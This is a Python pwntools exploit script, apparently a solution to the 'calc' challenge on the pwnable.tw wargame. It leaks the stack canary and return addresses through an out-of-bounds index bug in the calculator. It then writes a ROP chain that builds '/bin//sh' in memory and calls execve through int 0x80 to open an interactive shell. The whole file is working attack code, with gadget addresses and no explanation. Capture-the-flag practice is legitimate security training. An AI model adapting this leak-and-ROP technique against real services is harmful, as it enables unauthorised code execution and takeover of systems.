#!/bin/python
from pwn import *
from ctypes import *

context(arch='i386', os='linux')

conn = remote('chall.pwnable.tw', 10100)
#conn = remote('127.0.0.1', 2323)


def get_pool_data(i):
    with log.progress("Reading pool data: %d" % i) as p:
        conn.sendline('+%d' % (i + 1))
        data = int(conn.read())
        p.success(repr(data))
        return data


def set_pool_data(i, value):
    value = c_int(value).value
    with log.progress("Setting pool data i = %d, value = %d" % (i, value)) as p:
        if value > 0:
            conn.sendline('+%d+%d' % (i, value))
            conn.read()
        elif value < 0:
            current_value = get_pool_data(i + 1)
            set_pool_data(i, current_value)

            conn.sendline('+%d-%d' % (i + 1, -value))
            conn.read()

            conn.sendline('+%d-%d' % (i + 1, current_value))
            conn.read()
        else:
            current_value = get_pool_data(i + 1)
            set_pool_data(i, current_value)

            conn.sendline('+%d-%d' % (i + 1, current_value))
            conn.read()
        p.success()


conn.read()

canary = get_pool_data(356)
main_ebp = get_pool_data(359)
calc_ret_addr = get_pool_data(360)

reloc_offset = calc_ret_addr - 0x08049499
calc_ebp = (main_ebp & 0xFFFFFFF0) - 0x10 - 4 - 4
p_ret_addr = calc_ebp + 4


#set_pool_data(374, unpack(b'/sh\x00', 32))
#set_pool_data(373, unpack(b'/bin', 32))
#set_pool_data(372, 0x08049a21 + reloc_offset)
#set_pool_data(371, p_ret_addr + (373 - 360) * 4)
#set_pool_data(370, 0x080481d1 + reloc_offset)
#set_pool_data(369, 0xb)
#set_pool_data(368, 0x0805c34b + reloc_offset)
#set_pool_data(367, 0x0806f4eb + reloc_offset)
#set_pool_data(366, 1)
#set_pool_data(365, 1)
#set_pool_data(364, 0x080701d1 + reloc_offset)
#set_pool_data(363, 0x080dc6fe + reloc_offset)
#set_pool_data(362, 0x0805df07 + reloc_offset)
#set_pool_data(361, 0x0805d4bf + reloc_offset)
#set_pool_data(360, 0x08055165 + reloc_offset)
#set_pool_data(359, main_ebp)
#set_pool_data(358, 0x11111111)
#set_pool_data(357, 0x11111111)
#set_pool_data(356, canary)
def rebase_0(x): return x + 0x08048000


set_pool_data(24 + 360, rebase_0(0x00028880))  # 0x08070880: int 0x80; ret;
set_pool_data(23 + 360, (0x0000000b))
set_pool_data(22 + 360, rebase_0(0x0001434b))  # 0x0805c34b: pop eax; ret;
set_pool_data(21 + 360, rebase_0(0x000a4068))
set_pool_data(20 + 360, rebase_0(0x000281aa))  # 0x080701aa: pop edx; ret;
set_pool_data(19 + 360, rebase_0(0x000a4060))
set_pool_data(18 + 360, rebase_0(0x000001d1))  # 0x080481d1: pop ebx; ret;
set_pool_data(17 + 360, (0xdeadbeef))
set_pool_data(16 + 360, rebase_0(0x000a4068))
# 0x080701d1: pop ecx; pop ebx; ret;
set_pool_data(15 + 360, rebase_0(0x000281d1))
# 0x0809b30d: mov dword ptr [edx], eax; ret;
set_pool_data(14 + 360, rebase_0(0x0005330d))
set_pool_data(13 + 360, rebase_0(0x000a4068))
set_pool_data(12 + 360, rebase_0(0x000281aa))  # 0x080701aa: pop edx; ret;
set_pool_data(11 + 360, (0x00000000))
set_pool_data(10 + 360, rebase_0(0x0001434b))  # 0x0805c34b: pop eax; ret;
# 0x0809b30d: mov dword ptr [edx], eax; ret;
set_pool_data(9 + 360, rebase_0(0x0005330d))
set_pool_data(8 + 360, rebase_0(0x000a4064))
set_pool_data(7 + 360, rebase_0(0x000281aa))  # 0x080701aa: pop edx; ret;
set_pool_data(6 + 360, unpack(b'n/sh', 32))
set_pool_data(5 + 360, rebase_0(0x0001434b))  # 0x0805c34b: pop eax; ret;
# 0x0809b30d: mov dword ptr [edx], eax; ret;
set_pool_data(4 + 360, rebase_0(0x0005330d))
set_pool_data(3 + 360, rebase_0(0x000a4060))
set_pool_data(2 + 360, rebase_0(0x000281aa))  # 0x080701aa: pop edx; ret;
set_pool_data(1 + 360, unpack(b'//bi', 32))
set_pool_data(0 + 360, rebase_0(0x0001434b))  # 0x0805c34b: pop eax; ret;

set_pool_data(359, main_ebp)
set_pool_data(358, 0x11111111)
set_pool_data(357, 0x11111111)
set_pool_data(356, canary)

context.terminal = ["gnome-terminal", "-e"]
# gdb.attach("calc")

conn.sendline()
conn.interactive()
conn.close()
